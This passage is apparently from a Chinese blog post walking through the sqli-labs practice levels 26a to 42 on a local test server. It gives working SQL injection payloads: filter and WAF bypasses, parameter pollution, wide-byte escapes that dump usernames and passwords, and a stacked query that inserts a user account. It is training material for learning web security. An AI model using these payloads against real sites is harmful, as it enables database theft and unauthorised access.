+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27;anandd(extractvalue(1,concat(&#x27;~&#x27;,(database()))))oorr&#x27;1&#x27;=&#x27;1  //得库名</span><br><span class="line">?id=1&#x27;anandd(extractvalue(1,concat(&#x27;~&#x27;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)))))oorr&#x27;1&#x27;=&#x27;1  //得表名，后续同理</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><h3 id="不用报错判断闭合"><a href="#不用报错判断闭合" class="headerlink" title="不用报错判断闭合"></a>不用报错判断闭合</h3><p>该题and、or、注释符、空格被过滤；</p>
+<p>先判断闭合符号：</p>
+<ul>
+<li><p>输入&#x2F;?id&#x3D;1或者1”   页面均正常回显信息（有回显位，该题能用联合注入）</p>
+</li>
+<li><p>输入&#x2F;?id&#x3D;1’,显示 <em>Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in C:\phpstudy_pro\WWW\sql\Less-26a\index.php on line 36</em>（该题也不能用报错注入）</p>
+</li>
+</ul>
+<p> —》字符型，有单引号，但<strong>还得再判断是否有括号：</strong></p>
+<p>这里输入&#x2F;?id&#x3D;1’)%26%26(‘1’)&#x3D;(‘1  页面正常回显说明有小括号</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-28113526.png" alt="2024-11-28 113526"></p>
+<p>（注意，若用?id&#x3D;1’||’ 和?id&#x3D;1’||1’ 会让我们误判为就是单引号字符型注入，因为带入源码中id&#x3D;(‘1’||’’)和id&#x3D;(‘1’||’1’)返回的结果都会是id&#x3D;1）</p>
+<p>绕过空格：经过尝试，在该题%0B可以；</p>
+<p>进行union联合注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=&#x27;)%0Bunion%0Bselect%0B1,database(),3%0B||(&#x27;1&#x27;)=(&#x27;1   //库名</span><br><span class="line">/?id=&#x27;)%0Bunion%0Bselect%0B1,(select%0Bgroup_concat(table_name)%0Bfrom%0Binfoorrmation_schema.tables%0Bwhere%0Btable_schema=&#x27;security&#x27;),3%0B||(&#x27;1&#x27;)=(&#x27;1   //表名，后续同理</span><br></pre></td></tr></table></figure>
+
+<p><strong>补充：</strong>（摘自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46315342/article/details/106557886%EF%BC%89">https://blog.csdn.net/m0_46315342/article/details/106557886）</a></p>
+<h4 id="此题判断小括号的几种方法："><a href="#此题判断小括号的几种方法：" class="headerlink" title="此题判断小括号的几种方法："></a><strong>此题判断小括号的几种方法</strong>：</h4><ol>
+<li><pre><code>2&#39;&amp;&amp;&#39;1&#39;=&#39;1 
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">（    浏览器过滤了&amp;，所以测试时使用url编码%26 即2&#x27;%26%26&#x27;1&#x27;=&#x27;1   ）</span><br><span class="line"></span><br><span class="line">- 若查询语句为`where id=&#x27;$id&#x27;`，查询时是`where id=&#x27;2&#x27;&amp;&amp;&#x27;1&#x27;=&#x27;1&#x27;`，结果是`where id=&#x27;2&#x27;`，回显会是`id=2`。</span><br><span class="line">- 若查询语句为`where id=(&#x27;$id&#x27;)`，查询时是`where id=(&#x27;2&#x27;&amp;&amp;&#x27;1&#x27;=&#x27;1&#x27;)`，MySQL 将`&#x27;2&#x27;`作为了 Bool 值，结果是`where id=(&#x27;1&#x27;)`，回显会是`id=1`。</span><br><span class="line"></span><br><span class="line">2. ```</span><br><span class="line">   1&#x27;)||&#x27;1&#x27;=(&#x27;1</span><br></pre></td></tr></table></figure>
+
+   若查询语句有小括号正确回显，若无小括号错误回显（无回显）。
+</code></pre>
+</li>
+</ol>
+<h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><h3 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h3><p>页面有显示： <em>all your union and select belong to us</em></p>
+<p>经尝试该题的空格(可由%0b绕过）、注释符（可由and’1’&#x3D;’1或者直接 ‘ 绕过）也被过滤了，and和or没被过滤</p>
+<p>先输入?id&#x3D;1’ ，有报错提示，判断出闭合符号为单引号；</p>
+<p>该题可以大小写绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&#x27;unIon%0bseLect%0B1,2,database()&#x27; //库名，后续同理；</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h2><h3 id="不用报错判断闭合-1"><a href="#不用报错判断闭合-1" class="headerlink" title="不用报错判断闭合"></a>不用报错判断闭合</h3><p>过滤了注释符、union select；</p>
+<p><strong>判断闭合方式：</strong></p>
+<ul>
+<li><p>输入1或者1’均正常显示，1“报错但无具体报错信息,再换个方法</p>
+</li>
+<li><p>尝试输入</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&#x27;and &#x27;1 //页面正常显示</span><br><span class="line">/?id=1&#x27;and &#x27;0 //页面正常显示</span><br><span class="line">--&gt;闭合符号不是&#x27;</span><br><span class="line">1&quot;and&quot;1 //页面正常显示</span><br><span class="line">1&quot;and&quot;0 //页面显示错误</span><br><span class="line">--&gt;闭合符号为&quot;</span><br></pre></td></tr></table></figure>
+
+<p>进行union注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&quot;unioN%0bseLect%0b1,2,3&quot;   //可以用大小写来绕过，后续同理less-27</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>闭合判断方式同less-27a</p>
+<p>当输入&#x2F;?id&#x3D;1’and ‘1与&#x2F;?id&#x3D;1显示的界面一致，</p>
+<p>当输入 &#x2F;?id&#x3D;1’and ‘0 ，显示如下图，</p>
+<p>说明页面正确地对语句进行了判断；</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-28133403.png" alt="2024-11-28 133403"></p>
+<p>—&gt;闭合有单引号，再判断是否有括号：</p>
+<p>?id&#x3D;2’and’1’&#x3D;’1 显示出id为1的用户信息，故有括号；</p>
+<p>—》闭合方式为单引号加单括号；</p>
+<p>进行union注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?id=0&#x27;)unIon%0bselECt%0b1,2,3%0bor(&#x27;  //这里写成/?id=0&#x27;)unIon%0bselECt%0b1,2,3%0b(&#x27;不通过</span><br><span class="line">/?id=0&#x27;)unIon%0bselECt%0b1,database(),0%0bor(&#x27;  //库名，后续同理</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h2><p>输入2-1得id为2的用户信息，故为字符型；</p>
+<p>虽输入&#x2F;?id&#x3D;1’)显示异常，继续尝试</p>
+<ul>
+<li>&#x2F;?id&#x3D;1’)and(‘1    页面显示正常</li>
+<li>&#x2F;?id&#x3D;1’)and(‘0   页面无显示</li>
+</ul>
+<p>说明闭合符号为单引号加括号；</p>
+<p>后续与less-28同理，且该关只过滤了union select</p>
+<h2 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h2><h3 id="双服务器、参数污染"><a href="#双服务器、参数污染" class="headerlink" title="双服务器、参数污染"></a>双服务器、参数污染</h3><p><strong>分析：</strong></p>
+<p>打开页面有显示 <em>this site protected by world’s best firewall</em></p>
+<p>(其实Less-29需要两层服务器架构，在做题前应该下载jsp服务器。参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/46cb6c354de5">https://www.jianshu.com/p/46cb6c354de5</a> )<br>      “在ID后面输入id&#x3D;1&amp;id&#x3D;2，网站到底会去执行哪个ID呢，这里需要看我们使用的web容器，如果我们使用的web容器为apache，则会执行id&#x3D;2，如果为tomcat，则会执行id&#x3D;1，这里我的web容器为apache，所以会执行id&#x3D;2”</p>
+<p>”<strong>HPP (HTTP Parameter Pollution)</strong>，也就是 HTTP 参数污染。我们注入两个同名的参数 id，第一个参数用于绕过 WAF，第二个参数用于注入。“</p>
+<p>输入?id&#x3D;1’  跳转到&#x2F;login.php&#x2F;hacked.php网页下，</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-29/hacked.php%EF%BC%8C%E6%AD%A4%E4%B8%BA%E8%A2%ABwaf%E6%8B%A6%E6%88%AA%E7%9A%84%E9%A1%B5%E9%9D%A2%EF%BC%8C%E9%A1%B5%E9%9D%A2%E6%9C%89%E6%98%BE%E7%A4%BA%EF%BC%9A">http://127.0.0.1/sql/Less-29/hacked.php，此为被waf拦截的页面，页面有显示：</a> <em>go back and try again</em> ，点击后进入login.php的网页；</p>
+<p>输入?id&#x3D;1&amp;&amp;id&#x3D;2，网页回到 &#x2F;login.php&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2 下，且网页正常执行，显示id为2的用户信息；</p>
+<p>&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2’ 显示报错 *near ‘’2’’ LIMIT 0,1’ * ，可知为单引号闭合；</p>
+<p>进行union注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=1&amp;&amp;id=0&#x27;union select 1,2,database()--+</span><br></pre></td></tr></table></figure>
+
+<p>显示库名，后续同理less-1；</p>
+<h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>同理less-29，只是输入&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2’不显示报错信息，正常显示id为2的用户信息；</p>
+<p>进行闭合判断：</p>
+<p>法一：输入&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2” ，显示报错信息 <em>‘“2”” LIMIT 0,1’</em></p>
+<p>法二：</p>
+<ul>
+<li>&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2”and 1&#x3D;0–+   网页异常</li>
+<li>&#x2F;?id&#x3D;1&amp;&amp;id&#x3D;2”and 1&#x3D;1–+   网页正常显示id为2的用户信息</li>
+</ul>
+<p>—-&gt;闭合方式为双引号；后续与less-29同理；</p>
+<h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sql/Less-31/login.php/?id=1&&id=2">http://127.0.0.1/sql/Less-31/login.php/?id=1&amp;&amp;id=2</a>“  可由报错信息判断出为)”闭合，后续同理less-29；</p>
+<h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><h3 id="宽字节绕过-get型"><a href="#宽字节绕过-get型" class="headerlink" title="宽字节绕过(get型)"></a>宽字节绕过(get型)</h3><p>当输入 &#x2F;?id&#x3D;1’<br>页面有显示：Hint: The Query String you input is escaped as : 1\‘</p>
+<p>(or:<code>1</code>、<code>1&#39;</code>、<code>1&quot;</code>都能正常回显，可以猜测输入的引号被过滤，从页面给的 hint 也证实了这一点。)</p>
+<p>且由标题可知，addslashes()函数转义了引号；</p>
+<p>在单引号前加**%df** ，有显示报错信息： ‘’1�&#39;‘ LIMIT 0,1’ </p>
+<p>判断出为单引号闭合；且当输入&#x2F;?id&#x3D;1%df’–+ 页面正常显示id为1的信息；</p>
+<p>后续使用union注入即可：</p>
+<h4 id="但注意！"><a href="#但注意！" class="headerlink" title="但注意！"></a>但<strong>注意！</strong></h4><p>该题使用addslashes函数对于输入的内容进行转义，故当使用union注入要用到**’users’<strong>时，不能用<em>table_name&#x3D;%df”users%df”</em>，因为会被视为users�，可将表名换成</strong>十六进制编码**，即<em>table_name&#x3D;0x7573657273</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/?id=0 union select 1,database(),3--+  //库名</span><br><span class="line"> </span><br><span class="line">/?id=0 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database() ) ,3--+    //表名</span><br><span class="line"> </span><br><span class="line">/?id=0 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273) ,3--+   //字段，注意users换为16进制编码</span><br><span class="line"> </span><br><span class="line">?id=-1%df%27%20union%20select%201,group_concat(password,username),3%20from%20users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/11/sqli-labs/2024-11-30090632.png" alt="2024-11-30 090632"></p>
+<p>（注意：数据库为gbk时可使用%df绕过）</p>
+<p>%df 可以换为<code>%bb%27</code>或<code>%bb%5c%5c%27</code>代替<br>（%5c ☞ \  ）</p>
+<h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>与less-32一致…</p>
+<h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><h3 id="宽字节绕过-post型！"><a href="#宽字节绕过-post型！" class="headerlink" title="宽字节绕过(post型！)"></a>宽字节绕过(post型！)</h3><p>在username处输入 admin’  </p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-30091306.png" alt="2024-11-30 091306"></p>
+<p>可知引号被转义了；（在password处输入也被转义）</p>
+<p>在username处输入 admin%df’  （或者在hackbar输入）,页面无回显，<strong>原因</strong>：</p>
+<p> 在post中， %经过url编码会变为%25</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get与post提交数据的不同，get型直接以url形式提交，也就是说遇到%bb,%27这种直接当做url编码后处理，而post型却不是这样，他会把你提交的%bb,%27当做正常数据，然后进行url编码，于是就变成了%25bb,%2527</span><br></pre></td></tr></table></figure>
+
+<p>（摘自、详细见：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/105896415">Sqli-labs之Less-34_sqli34-CSDN博客</a>）</p>
+<p><strong>使用burp来post参数：</strong></p>
+<p>1.先输入在网页输入，burp拦截</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-30094746.png" alt="2024-11-30 094746"></p>
+<p>2.将burp中最后一行多出的25删去，即变为:</p>
+<p><em>uname&#x3D;admin%df%27&amp;passwd&#x3D;1&amp;submit&#x3D;Submit</em></p>
+<p>3.后续进行union注入即可，像输入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df%27union select 1,database()--+ &amp;passwd=admin&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/11/sqli-labs/2024-11-30100410.png" alt="2024-11-30 100410"></p>
+<h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><p>此题为get型，</p>
+<p>输入id&#x3D;1与2-1均显示id为1的用户信息，判断为数值型；</p>
+<h5 id="判断注释符哪个能用的例子："><a href="#判断注释符哪个能用的例子：" class="headerlink" title="判断注释符哪个能用的例子："></a>判断注释符哪个能用的例子：</h5><p>方法一：（此关）</p>
+<ul>
+<li>&#x2F;?id&#x3D;1 group by 3#1<ul>
+<li><em>Hint: The Query String you input is escaped as : 1 group by 3</em></li>
+</ul>
+</li>
+<li>?id&#x3D;1 group by 3–+1<ul>
+<li>Hint: The Query String you input is escaped as : 1 group by 3– 1</li>
+</ul>
+</li>
+</ul>
+<p>—&gt; 该题注释符可以用–+</p>
+<p>方法二：（若能显示报错信息）</p>
+<p>当输入&#x2F;?id&#x3D;1’  有报错信息，例如出现near ‘’ LIMIT 0,1’ ，闭合符号为单引号时，</p>
+<ul>
+<li>&#x2F;?id&#x3D;1’ –+ 无报错信息，页面正常 ，则–+可用</li>
+<li>&#x2F;?id&#x3D;1’#  仍显示报错，则#不可用</li>
+</ul>
+<p>后续同理less-32进行联合注入；</p>
+<h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>输入&#x2F;?id&#x3D;1’， 页面有显示<em>Hint: The Query String you input is escaped as : 1&#39;</em></p>
+<p>输入&#x2F;?id&#x3D;1%df’   显示<em>near ‘’1�\‘’ LIMIT 0,1’</em>     判断出单引号闭合,</p>
+<p>后续与less-32同理；</p>
+<h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>get型，对引号会转义，判断出为单引号闭合；</p>
+<p><img src="/2025/07/11/sqli-labs/2024-11-30111254.png" alt="2024-11-30 111254"></p>
+<p>与less-34同理；</p>
+<p>eg：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df%27union select 1,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273)--+&amp;passwd=&amp;submit=Submit    //字段</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>get型，输入&#x2F;?id&#x3D;1’  判断出单引号闭合；</p>
+<p>后续union注入即可；</p>
+<p>注：该关可以堆叠注入，因为存在mysqli_multi_query函数</p>
+<ul>
+<li>mysqli_multi_query支持多条sql语句同时进行。</li>
+</ul>
+<h2 id="less-39"><a href="#less-39" class="headerlink" title="less-39"></a>less-39</h2><p>输入&#x2F;?id&#x3D;1与&#x2F;?id&#x3D;2-1页面显示一致，为数字型；</p>
+<p>后续同union联合注入；</p>
+<h2 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h2><p>先判断出为字符型，无报错信息显示；</p>
+<p>判断闭合符号：</p>
+<ul>
+<li>&#x2F;?id&#x3D;1’)and 0–+  页面无回显</li>
+<li>&#x2F;?id&#x3D;1’)and 0–+  页面正常回显用户为1的信息</li>
+</ul>
+<p>为‘）闭合方式；</p>
+<p>后续union注入即可；</p>
+<h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>由&#x2F;?id&#x3D;1与&#x2F;?id&#x3D;2-1判断为数字型，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=0 union select 1,2,3--+  //判断出回显位为2，3</span><br></pre></td></tr></table></figure>
+
+<p>后续union注入即可；</p>
+<h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>打开的页面与less-24相同，但点击</p>
+<ul>
+<li>new user click here？<ul>
+<li><em>if you need to create account ,then hack your way in</em></li>
+</ul>
+</li>
+<li>forgot your password?<ul>
+<li>if you forgot your password,go hack it</li>
+</ul>
+</li>
+</ul>
+<p>故要想办法去登录上一个账号；</p>
+<p>在username处尝试注入，</p>
+<ul>
+<li>丢入引号均不报错，万能密码也没绕过，%df加引号也无效（看源码知此数据库不为gbk）</li>
+</ul>
+<p>在password处尝试注入，</p>
+<ul>
+<li>输入1’  ，有报错信息显示<em>near ‘’1’’’ at line 1</em>，<strong>故为单引号闭合，而不是双引号闭合</strong>，故此处有注入点；</li>
+</ul>
+<p>使用union注入：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,2,3  //判断回显位</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/07/11/sqli-labs/2024-11-30160012.png" alt="2024-11-30 160012"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,database(),2#   //库名，后续表名、列名同理；</span><br></pre></td></tr></table></figure>
+
+<p>若想创建一个账号：</p>
+<p>在password处进行堆叠注入，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;insert into users values(1999,&#x27;test&#x27;,&#x27;pass&#x27;)#</span><br></pre></td></tr></table></figure>
+
+<p>之后显示异常页面，但回到登录页面，输入username为test，password为pass，即可登录成功；</p>
+<img src="./2024-11-30160627.png" alt="2024-11-30 160627" style="zoom:67%;" />
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2025/07/11/network/" title="network"><span class="has-text-weight-semibold">Next: network</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="git@github.com:ting-06a/ting-06a.github.io.git" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/ting-06a"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> ting-06a 2025</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
